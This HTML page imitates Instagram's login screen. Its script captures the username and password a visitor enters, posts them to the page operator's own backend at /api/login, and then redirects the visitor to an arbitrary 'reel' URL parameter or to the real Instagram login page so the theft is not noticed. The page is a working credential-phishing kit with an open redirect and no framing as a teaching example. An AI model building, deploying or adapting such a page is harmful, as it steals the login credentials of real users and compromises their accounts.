<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        /* CSS VARIABLES FOR ADAPTIVE THEME */
        :root {
            --bg-color: #fafafa;
            --box-bg: #ffffff;
            --border-color: #dbdbdb;
            --text-primary: #262626;
            --input-bg: #fafafa;
            --logo-filter: none;
        }

        @media (prefers-color-scheme: dark) {
            :root {
                --bg-color: #000000;
                --box-bg: #000000;
                --border-color: #262626;
                --text-primary: #f5f5f5;
                --input-bg: #121212;
                --logo-filter: invert(1); /* Turns a black local logo white */
            }
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body { 
            background-color: var(--bg-color); 
            color: var(--text-primary);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            flex-direction: column; 
            position: relative;
        }

        /* TOP LEFT ICON */
        .top-left-icon {
            position: absolute;
            top: 20px;
            left: 20px;
            width: 28px;
            filter: var(--logo-filter);
        }
        
        .container { width: 350px; display: flex; flex-direction: column; gap: 10px; }

        .box { 
            background: var(--box-bg); 
            border: 1px solid var(--border-color); 
            padding: 20px 40px; 
            text-align: center; 
        }
        
        /* THE MAIN LOGO */
        .main-logo { 
            width: 175px; 
            margin: 20px 0 30px; 
            filter: var(--logo-filter); /* Ensures visibility in dark mode */
        }

        input { 
            width: 100%; height: 38px; 
            background: var(--input-bg); 
            border: 1px solid var(--border-color); 
            color: var(--text-primary);
            border-radius: 3px; padding: 9px 8px; margin-bottom: 6px; font-size: 12px; 
        }

        button { 
            width: 100%; background: #0095f6; color: white; border: none; 
            border-radius: 8px; height: 32px; font-weight: 600; cursor: pointer; margin: 8px 0; 
        }
        
        .forgot-link { margin-top: 20px; font-size: 13px; color: #00376b; text-decoration: none; display: block; }
        .signup-text { font-size: 14px; margin: 15px 0; }
        .signup-text span { color: #0095f6; font-weight: 600; }
    </style>
</head>
<body>

<img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="top-left-icon" alt="Insta">

<div class="container">
    <div class="box">
        <img src="logo.png" class="main-logo" alt="Instagram">
        
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>

        <a href="#" class="forgot-link">Forgot password?</a>
    </div>

    <div class="box">
        <p class="signup-text">Don't have an account? <span>Sign up</span></p>
    </div>
</div>
<script>
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        
        // 1. Capture the data from your input fields
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;

        try {
            // 2. Send the data to your backend API
            await fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user, pass })
            });
        } catch (error) {
            // Log any network errors for debugging
            console.error('API Error:', error);
        }

        // 3. Handle Redirection
        const params = new URLSearchParams(window.location.search);
        const nextLink = params.get('reel');

        // Redirect to the provided 'reel' link or default to Instagram login
        window.location.href = nextLink || "https://www.instagram.com/accounts/login/";
    });
</script>

</body>
</html>
